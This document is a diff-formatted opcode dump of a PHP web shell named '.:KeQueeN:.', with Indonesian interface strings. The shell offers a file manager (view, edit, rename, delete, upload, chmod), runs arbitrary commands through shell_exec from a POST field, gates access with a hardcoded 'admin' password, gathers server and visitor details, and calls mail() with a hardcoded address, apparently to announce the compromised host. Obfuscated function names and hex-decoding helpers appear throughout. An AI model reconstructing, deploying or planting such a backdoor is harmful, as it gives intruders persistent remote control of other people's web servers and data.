@@ -1,0 +1,678 @@
+FunctionStart 
+IS_EQUAL 'delete'
+INIT_FCALL 'session_start'
+DO_ICALL 
+INIT_FCALL 'basename'
+FETCH_R '_POST'
+FETCH_DIM_R 'new_file_name'
+DO_ICALL 
+ECHO ' <input type="text" name="new_permissions" id="new_permissions" class="border p-1" value='
+INIT_FCALL_BY_NAME 'fo73'
+SEND_VAL_EX 'Berhasil+mengubah+nama+f'
+DO_FCALL 
+ASSIGN 'INI+SHELL'
+INIT_FCALL_BY_NAME 'Scsoc'
+FETCH_FUNC_ARG '_GET'
+FETCH_DIM_FUNC_ARG 'n'
+DO_FCALL 
+FETCH_IS '_GET'
+ISSET_ISEMPTY_DIM_OBJ 'p'
+ECHO '</font> </h5> <div class="form-group"> <textarea name="file_content" id="file_c'
+INIT_FCALL 'getcwd'
+DO_ICALL 
+ECHO '<h5 class="p-1 rainbow-border" style="text-align: center;">  View File Name : <font color='
+FETCH_R '_POST'
+FETCH_DIM_R 'new_permissions'
+INIT_FCALL 'phpversion'
+DO_ICALL 
+ECHO '</div> <div class="table-responsive text-light rainbow-border" style="text-align: left;padding'
+INIT_FCALL 'ignore_user_abort'
+DO_ICALL 
+FETCH_IS '_GET'
+ISSET_ISEMPTY_DIM_OBJ 'a'
+FAST_CONCAT '/'
+INIT_FCALL_BY_NAME 'SCsOc'
+FETCH_FUNC_ARG '_GET'
+FETCH_DIM_FUNC_ARG 'n'
+DO_FCALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'file_content'
+INIT_FCALL 'getenv'
+SEND_VAL 'REMOTE_ADDR'
+DO_ICALL 
+INIT_FCALL 'getcwd'
+DO_ICALL 
+INIT_FCALL 'http_response_code'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'command'
+INIT_FCALL 'file_exists'
+DO_ICALL 
+INIT_FCALL 'rename'
+DO_ICALL 
+ROPE_ADD '/'
+INIT_FCALL_BY_NAME 'scSOC'
+DO_FCALL 
+INIT_FCALL 'htmlspecialchars'
+DO_ICALL 
+ECHO '<table class="table table-hover table-borderless table-sm" style="text-align: center;width: 100%;'
+INIT_FCALL_BY_NAME 'jq1U'
+DO_FCALL 
+ECHO '</span></li> <li>Server IP : <span style="color: white;">'
+IS_EQUAL 'view'
+INIT_FCALL 'file_exists'
+DO_ICALL 
+INIT_DYNAMIC_CALL 
+DO_FCALL 
+FETCH_IS '_GET'
+ISSET_ISEMPTY_DIM_OBJ 'a'
+ECHO '</h5> <form method="post">  <div class="form-group"> '
+ECHO '</h5> <form method="post">  <div class="form-group">  <input type="text" name'
+ECHO '<h5 class="p-1 rainbow-border">Rename File : '
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL_BY_NAME 'Ce_vX'
+ROPE_ADD '/'
+DO_FCALL 
+CONCAT '  <tr> <td style="text-align: left;"> <i class="fa fa-fw fa-folder-o" style="border'
+CONCAT '" data-toggle="tooltip" data-placement="auto" title="Latest modify on '
+INIT_DYNAMIC_CALL 
+SEND_VAL_EX 'Y-m-d H:i'
+INIT_DYNAMIC_CALL 
+ROPE_ADD '/'
+DO_FCALL 
+DO_FCALL 
+ROPE_INIT '">'
+ROPE_END '</a></td> <td style="color: black;"><span></span></td> <td>  <a h'
+INIT_FCALL_BY_NAME 'cE_vX'
+DO_FCALL 
+CONCAT '&a='
+INIT_FCALL_BY_NAME 'cE_VX'
+SEND_VAL_EX 'changePerms'
+DO_FCALL 
+CONCAT '&n='
+INIT_FCALL_BY_NAME 'cE_vX'
+DO_FCALL 
+CONCAT '" data-toggle="tooltip" data-placement="auto" title="Change Permissions" data-original-title="C'
+INIT_DYNAMIC_CALL 
+ROPE_ADD '/'
+DO_FCALL 
+QM_ASSIGN '#00ff00'
+INIT_DYNAMIC_CALL 
+ROPE_ADD '/'
+DO_FCALL 
+QM_ASSIGN '#a200ff'
+QM_ASSIGN 'null'
+CONCAT '">'
+INIT_FCALL_BY_NAME 'knstU'
+ROPE_ADD '/'
+DO_FCALL 
+CONCAT '</font></a>  </td> <td style="color: black;width: 9.5%;"><span></span'
+INIT_FCALL_BY_NAME 'cE_Vx'
+DO_FCALL 
+CONCAT '&a='
+INIT_FCALL_BY_NAME 'Ce_Vx'
+SEND_VAL_EX 'rename'
+DO_FCALL 
+CONCAT '&n='
+INIT_FCALL_BY_NAME 'CE_VX'
+DO_FCALL 
+CONCAT '&t=d" data-toggle="tooltip" data-placement="auto" title="Rename">Rename</a> </td'
+INIT_FCALL_BY_NAME 'Ce_VX'
+DO_FCALL 
+CONCAT '&a='
+INIT_FCALL_BY_NAME 'ce_vx'
+SEND_VAL_EX 'delete'
+DO_FCALL 
+CONCAT '&n='
+INIT_FCALL_BY_NAME 'Ce_vx'
+DO_FCALL 
+CONCAT '" class="delete" data-type="folder" data-toggle="tooltip" data-placement="auto" title="De'
+INIT_DYNAMIC_CALL 
+ROPE_ADD '/'
+DO_FCALL 
+ECHO ' <div class="form-group">  <textarea cols="30" rows="5" class="form-control rainbow-bor'
+FETCH_IS '_FILES'
+FETCH_DIM_IS 'f'
+ISSET_ISEMPTY_DIM_OBJ 'name'
+FETCH_R '_FILES'
+FETCH_DIM_R 'f'
+FETCH_DIM_R 'name'
+INIT_FCALL_BY_NAME 'fo73'
+SEND_VAL_EX 'Folder+berhasil+dibu'
+DO_FCALL 
+FETCH_W '_SESSION'
+ASSIGN_DIM 'authenticated'
+ROPE_ADD '/'
+INIT_FCALL_BY_NAME 'Fo73'
+SEND_VAL_EX 'Berhasil+mengubah+iz'
+DO_FCALL 
+ECHO ' <!DOCTYPE html>  <html>  <head>  <title>.:KeQueeN:.</title>  </head>  '
+INIT_FCALL_BY_NAME 'FO73'
+SEND_VAL_EX 'File+berhasil+dibuat'
+INIT_FCALL_BY_NAME 'Ce_VX'
+SEND_VAL_EX 'view'
+DO_FCALL 
+CONCAT '&a='
+CONCAT '&n='
+INIT_FCALL_BY_NAME 'ce_Vx'
+DO_FCALL 
+DO_FCALL 
+INIT_FCALL_BY_NAME 'fo73'
+SEND_VAL_EX 'file+deleted+successfully'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'fO73'
+SEND_VAL_EX 'Gagal+mengubah+nama+file'
+DO_FCALL 
+INIT_DYNAMIC_CALL 
+INIT_FCALL 'scsoc'
+FETCH_R '_GET'
+FETCH_DIM_R 'p'
+DO_FCALL 
+DO_FCALL 
+INIT_FCALL 'shell_exec'
+DO_ICALL 
+IS_EQUAL 'changePerms'
+INIT_FCALL 'getcwd'
+DO_ICALL 
+INIT_FCALL 'htmlspecialchars'
+INIT_FCALL 'file_get_contents'
+INIT_FCALL 'getcwd'
+DO_ICALL 
+CONCAT '/'
+INIT_FCALL 'scsoc'
+FETCH_R '_GET'
+FETCH_DIM_R 'n'
+DO_FCALL 
+DO_ICALL 
+DO_ICALL 
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL_BY_NAME 'CE_vX'
+DO_FCALL 
+ECHO '<a href="?p=2f" class="combet">~</a>/'
+ECHO '2f'
+ROPE_INIT '">'
+ROPE_END '</a>/'
+ECHO '<a class="combet" href="?p='
+INIT_DYNAMIC_CALL 
+INIT_DYNAMIC_CALL 
+DO_FCALL 
+DO_FCALL 
+ASSIGN 'alexspedo878@gmail.com'
+INIT_FCALL 'error_reporting'
+DO_ICALL 
+INIT_FCALL 'getcwd'
+DO_ICALL 
+ECHO '</div> '
+ECHO '</textarea> </div> '
+INIT_FCALL 'getcwd'
+DO_ICALL 
+ECHO '<h5 class="p-1 rainbow-border" style="text-align: center;">Nama File Baru :</h5> <form '
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'run_command'
+INIT_FCALL_BY_NAME 'Fo73'
+SEND_VAL_EX 'failed+to+delete+the+folder'
+DO_FCALL 
+ASSIGN 'Shell+kamu+heheh'
+ECHO '<h5 class="p-1 rainbow-border" style="text-align: center;">Edit Nama File: <font color="whi'
+ECHO '</span></li> <li><a href="?p='
+INIT_FCALL 'basename'
+FETCH_R '_POST'
+FETCH_DIM_R 'folder_name'
+DO_ICALL 
+FETCH_IS '_GET'
+ISSET_ISEMPTY_DIM_OBJ 'n'
+INIT_DYNAMIC_CALL 
+SEND_VAL_EX '/(\\|\/)/'
+DO_FCALL 
+INIT_FCALL 'htmlspecialchars'
+INIT_FCALL 'scsoc'
+FETCH_R '_GET'
+FETCH_DIM_R 'n'
+DO_FCALL 
+DO_ICALL 
+ECHO '</span></li> <li>Server Software : <span style="color: white;">'
+IS_EQUAL 'newFile'
+INIT_FCALL 'scsoc'
+FETCH_R '_GET'
+FETCH_DIM_R 'n'
+DO_FCALL 
+ECHO '<h5 class="p-1 rainbow-border">Ubah Izin : '
+FETCH_R '_FILES'
+FETCH_DIM_R 'f'
+FETCH_DIM_R 'name'
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'move_uploaded_file'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'FO73G'
+SEND_VAL_EX 'Gagal+mengunggah+file.'
+DO_FCALL 
+INIT_FCALL 'getcwd'
+DO_ICALL 
+CONCAT '/'
+FETCH_R '_FILES'
+FETCH_DIM_R 'f'
+FETCH_DIM_R 'tmp_name'
+INIT_FCALL_BY_NAME 'FO73'
+SEND_VAL_EX 'File+berhasil+diunggah.'
+DO_FCALL 
+ECHO '<form method="post">  <div class="form-group">  <input type="text" name="command"'
+INIT_FCALL_BY_NAME 'fO73'
+SEND_VAL_EX 'File+gagal+dibua'
+DO_FCALL 
+INIT_FCALL 'set_time_limit'
+DO_ICALL 
+IS_EQUAL 'rename'
+INIT_FCALL 'scsoc'
+FETCH_R '_GET'
+FETCH_DIM_R 'a'
+DO_FCALL 
+ECHO '  </span></li></div> <div class="table-responsive text-light" style="text-align: ce'
+ECHO '</textarea> </div> '
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'submit'
+INIT_FCALL 'file_exists'
+DO_ICALL 
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+IS_EQUAL 'newDir'
+ECHO '<h5 class="p-1 rainbow-border" style="text-align: center;">Nama Folder Baru :</h5> <for'
+INIT_FCALL 'fo73g'
+SEND_VAL 'failed+to+delete+the+file'
+DO_FCALL 
+INIT_FCALL 'htmlspecialchars'
+INIT_FCALL 'scsoc'
+FETCH_R '_GET'
+FETCH_DIM_R 'n'
+DO_FCALL 
+DO_ICALL 
+INIT_DYNAMIC_CALL 
+INIT_DYNAMIC_CALL 
+INIT_FCALL 'getcwd'
+DO_ICALL 
+CONCAT '/'
+INIT_FCALL 'scsoc'
+FETCH_R '_GET'
+FETCH_DIM_R 'n'
+DO_FCALL 
+DO_FCALL 
+DO_FCALL 
+ECHO '  <!DOCTYPE html> <html lang="en"> <head>  <meta property="og:image" content='
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL_BY_NAME 'Ce_Vx'
+DO_FCALL 
+CONCAT ' <tr> <td style="text-align: left;"> <i class="fa fa-fw fa-file-o" style="border:'
+CONCAT '&a='
+INIT_FCALL_BY_NAME 'CE_vX'
+SEND_VAL_EX 'view'
+DO_FCALL 
+CONCAT '&n='
+INIT_FCALL_BY_NAME 'ce_vx'
+DO_FCALL 
+CONCAT '" data-toggle="tooltip" data-placement="auto" title="Latest modify on '
+INIT_DYNAMIC_CALL 
+SEND_VAL_EX 'Y-m-d H:i'
+INIT_DYNAMIC_CALL 
+ROPE_ADD '/'
+DO_FCALL 
+DO_FCALL 
+ROPE_INIT '">'
+ROPE_ADD '</a></td> <td><span>'
+ROPE_END '</span></td> <td>  <a href="?p='
+INIT_FCALL_BY_NAME 'CE_vX'
+DO_FCALL 
+CONCAT '&a='
+INIT_FCALL_BY_NAME 'ce_vx'
+SEND_VAL_EX 'changePerms'
+DO_FCALL 
+CONCAT '&n='
+INIT_FCALL_BY_NAME 'CE_VX'
+DO_FCALL 
+CONCAT '" data-toggle="tooltip" data-placement="auto" title="Change Permissions" data-original-title="C'
+INIT_DYNAMIC_CALL 
+ROPE_ADD '/'
+DO_FCALL 
+QM_ASSIGN '#00ff00'
+INIT_DYNAMIC_CALL 
+ROPE_ADD '/'
+DO_FCALL 
+QM_ASSIGN '#a200ff'
+QM_ASSIGN 'null'
+CONCAT '">'
+INIT_FCALL_BY_NAME 'KnSTU'
+ROPE_ADD '/'
+DO_FCALL 
+CONCAT '</font></a>  </td> <td><a href="?p='
+INIT_FCALL_BY_NAME 'cE_VX'
+DO_FCALL 
+CONCAT '&a='
+INIT_FCALL_BY_NAME 'Ce_Vx'
+SEND_VAL_EX 'edit'
+DO_FCALL 
+CONCAT '&n='
+INIT_FCALL_BY_NAME 'Ce_vX'
+DO_FCALL 
+CONCAT '" data-toggle="tooltip" data-placement="auto" title="Edit">Edit</a></td> <td>'
+INIT_FCALL_BY_NAME 'CE_vx'
+DO_FCALL 
+CONCAT '&a='
+INIT_FCALL_BY_NAME 'CE_Vx'
+SEND_VAL_EX 'rename'
+DO_FCALL 
+CONCAT '&n='
+INIT_FCALL_BY_NAME 'ce_vX'
+DO_FCALL 
+CONCAT '&t=f" data-toggle="tooltip" data-placement="auto" title="Rename">Rename</a></td>'
+INIT_FCALL_BY_NAME 'Ce_vX'
+DO_FCALL 
+CONCAT '&a='
+INIT_FCALL_BY_NAME 'ce_vX'
+SEND_VAL_EX 'delete'
+DO_FCALL 
+CONCAT '&n='
+INIT_FCALL_BY_NAME 'ce_VX'
+DO_FCALL 
+CONCAT '" class="delete" data-type="file" data-toggle="tooltip" data-placement="auto" title="Dele'
+INIT_FCALL 'round'
+DIV 1024
+DO_ICALL 
+CONCAT '+MB'
+CONCAT '+KB'
+INIT_DYNAMIC_CALL 
+ROPE_ADD '/'
+DO_FCALL 
+INIT_DYNAMIC_CALL 
+ROPE_ADD '/'
+DO_FCALL 
+DIV 1024
+INIT_FCALL 'round'
+DO_ICALL 
+INIT_FCALL 'fo73g'
+SEND_VAL 'Gagal+menyimpan+file.'
+DO_FCALL 
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_USER_AGENT'
+INIT_FCALL 'scsoc'
+FETCH_R '_GET'
+FETCH_DIM_R 'p'
+DO_FCALL 
+IS_EQUAL 'edit'
+INIT_FCALL_BY_NAME 'ce_vx'
+DO_FCALL 
+CONCAT '&a='
+INIT_FCALL_BY_NAME 'ce_Vx'
+SEND_VAL_EX 'newDir'
+DO_FCALL 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'password'
+FETCH_R '_POST'
+FETCH_DIM_R 'password'
+IS_IDENTICAL 'admin'
+ECHO '</span></li> <li>PHP Version : <span style="color: white;">'
+ASSIGN 'scandir'
+CONCAT '/'
+INIT_FCALL 'scsoc'
+FETCH_R '_GET'
+FETCH_DIM_R 'n'
+DO_FCALL 
+INIT_FCALL 'scsoc'
+FETCH_R '_GET'
+FETCH_DIM_R 'n'
+DO_FCALL 
+ROPE_ADD '/'
+INIT_FCALL 'fo73g'
+SEND_VAL 'Folder+gagal+dib'
+DO_FCALL 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'rename_file'
+FAST_CONCAT '/'
+INIT_FCALL 'scsoc'
+FETCH_R '_GET'
+FETCH_DIM_R 'n'
+DO_FCALL 
+INIT_FCALL 'mkdir'
+DO_ICALL 
+INIT_FCALL 'basename'
+FETCH_R '_POST'
+FETCH_DIM_R 'new_file_name'
+DO_ICALL 
+FETCH_R '_GET'
+FETCH_DIM_R 't'
+IS_EQUAL 'd'
+INIT_FCALL 'getcwd'
+DO_ICALL 
+CONCAT '/'
+FETCH_R '_GET'
+FETCH_DIM_R 't'
+IS_EQUAL 'f'
+INIT_FCALL 'scsoc'
+FETCH_R '_GET'
+FETCH_DIM_R 'n'
+DO_FCALL 
+INIT_FCALL 'unlink'
+DO_ICALL 
+FETCH_R '_SERVER'
+FETCH_DIM_R 'SERVER_SOFTWARE'
+INIT_FCALL 'gethostbyname'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'REMOTE_ADDR'
+DO_ICALL 
+INIT_FCALL 'chmod'
+INIT_FCALL 'octdec'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'gethostbyname'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'SERVER_NAME'
+DO_ICALL 
+ECHO '</span></li> <li>Server : <span style="color: white;">'
+INIT_FCALL 'fo73g'
+SEND_VAL 'Tidak+ada+file+yang+diunggah.'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'cE_vx'
+DO_FCALL 
+CONCAT '&a='
+INIT_FCALL_BY_NAME 'cE_VX'
+SEND_VAL_EX 'newFile'
+DO_FCALL 
+ECHO '" style="text-align: center;">  </div>  <div class="form-group" style="margin-top'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'create_folder'
+INIT_FCALL 'fo73g'
+SEND_VAL 'File+berhasil+disimpan.'
+DO_FCALL 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'mengedit_file'
+ECHO '" style="text-align: center;">  </div>  <div class="form-group" style="margin-top'
+FETCH_IS '_SESSION'
+ISSET_ISEMPTY_DIM_OBJ 'authenticated'
+FETCH_R '_SESSION'
+FETCH_DIM_R 'authenticated'
+FETCH_R '_POST'
+FETCH_DIM_R 'file_content'
+INIT_FCALL 'fo73g'
+SEND_VAL 'Nama+folder+telah+diguna'
+INIT_FCALL_BY_NAME 'Ce_VX'
+SEND_VAL_EX 'newDir'
+DO_FCALL 
+CONCAT '&a='
+DO_FCALL 
+INIT_FCALL 'file_put_contents'
+DO_ICALL 
+FETCH_R '_SERVER'
+FETCH_DIM_R 'REQUEST_URI'
+INIT_FCALL 'substr'
+INIT_FCALL 'sprintf'
+SEND_VAL '%o'
+INIT_FCALL 'fileperms'
+DO_ICALL 
+DO_ICALL 
+SEND_VAL '-4'
+DO_ICALL 
+ECHO '  </div> <script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script> <script'
+INIT_FCALL 'file_put_contents'
+DO_ICALL 
+ECHO '</font></h5> <form method="post">  <div class="form-group">  <textarea name='
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'change_perms'
+INIT_FCALL 'scsoc'
+FETCH_R '_GET'
+FETCH_DIM_R 'n'
+DO_FCALL 
+INIT_FCALL 'ini_set'
+SEND_VAL 'display_errors'
+DO_ICALL 
+INIT_FCALL 'php_uname'
+DO_ICALL 
+ECHO '</textarea>  </div>  <div class="form-group" style="margin-top: 10px;">  <butto'
+INIT_FCALL 'fo73g'
+SEND_VAL 'Gagal+mengubah+i'
+DO_FCALL 
+INIT_FCALL 'fo73g'
+SEND_VAL 'folder+deleted+successfully'
+DO_FCALL 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'create_file'
+ASSIGN 'Command+tidak+boleh+kosong.'
+ECHO '" class="ohct">Buat Folder</a></li> <form action="" method="POST" enctype="mu'
+ECHO '" class="ohct">Buat File</a> | <a href="?p='
+ROPE_ADD '+'
+ROPE_ADD '+'
+ROPE_ADD '+'
+ECHO '  </tbody> </table> '
+INIT_FCALL 'mail'
+DO_ICALL 
+RETURN 1
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'chr'
+INIT_FCALL 'hexdec'
+ADD 1
+DO_ICALL 
+DO_ICALL 
+RETURN 
+SUB 1
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+BIND_GLOBAL 'kJDvx'
+ROPE_INIT '<script>swal({title: "'
+ROPE_ADD '", text: "'
+ROPE_ADD '", icon: "'
+ROPE_END '"}).then((btnClick) => {if(btnClick){document.location.href="?p='
+INIT_FCALL_BY_NAME 'ce_VX'
+DO_FCALL 
+CONCAT '"}})</script>'
+QM_ASSIGN 'success'
+QM_ASSIGN 'error'
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'is_dir'
+DO_ICALL 
+INIT_FCALL 'array_diff'
+INIT_FCALL 'scandir'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'trim'
+INIT_FCALL 'pathinfo'
+DO_ICALL 
+SEND_VAL '.'
+DO_ICALL 
+INIT_FCALL 'rmdir'
+DO_ICALL 
+RETURN 'null'
+INIT_FCALL 'rmdir'
+DO_ICALL 
+RETURN 'null'
+BIND_GLOBAL 'OwP2'
+INIT_FCALL 'array_map'
+DECLARE_LAMBDA_FUNCTION 
+INIT_FCALL 'array_diff'
+INIT_FCALL 'scandir'
+DO_ICALL 
+DO_ICALL 
+DO_ICALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+CONCAT '/'
+INIT_FCALL 'is_dir'
+DO_ICALL 
+INIT_FCALL 'unlink'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'Jq1U'
+DO_FCALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'dechex'
+INIT_FCALL 'ord'
+DO_ICALL 
+DO_ICALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+ASSIGN 'd'
+BW_AND 2
+QM_ASSIGN 'w'
+QM_ASSIGN '-'
+BW_AND 1
+BW_AND 512
+QM_ASSIGN 't'
+QM_ASSIGN 'x'
+BW_AND 512
+QM_ASSIGN 'T'
+QM_ASSIGN '-'
+BW_AND 24576
+RETURN 
+ASSIGN '-'
+BW_AND 128
+QM_ASSIGN 'w'
+QM_ASSIGN '-'
+BW_AND 32768
+BW_AND 49152
+BW_AND 32
+QM_ASSIGN 'r'
+QM_ASSIGN '-'
+ASSIGN 's'
+ASSIGN 'c'
+BW_AND 8192
+BW_AND 8
+BW_AND 1024
+QM_ASSIGN 's'
+QM_ASSIGN 'x'
+BW_AND 1024
+QM_ASSIGN 'S'
+QM_ASSIGN '-'
+ASSIGN 'b'
+BW_AND 4
+QM_ASSIGN 'r'
+QM_ASSIGN '-'
+ASSIGN 'u'
+BW_AND 256
+QM_ASSIGN 'r'
+QM_ASSIGN '-'
+ASSIGN 'p'
+BW_AND 16
+QM_ASSIGN 'w'
+QM_ASSIGN '-'
+ASSIGN 'l'
+BW_AND 4096
+INIT_FCALL 'fileperms'
+DO_ICALL 
+BW_AND 16384
+BW_AND 40960
+BW_AND 64
+BW_AND 2048
+QM_ASSIGN 's'
+QM_ASSIGN 'x'
+BW_AND 2048
+QM_ASSIGN 'S'
+QM_ASSIGN '-'
+RETURN 'null'
+FunctionEnd 
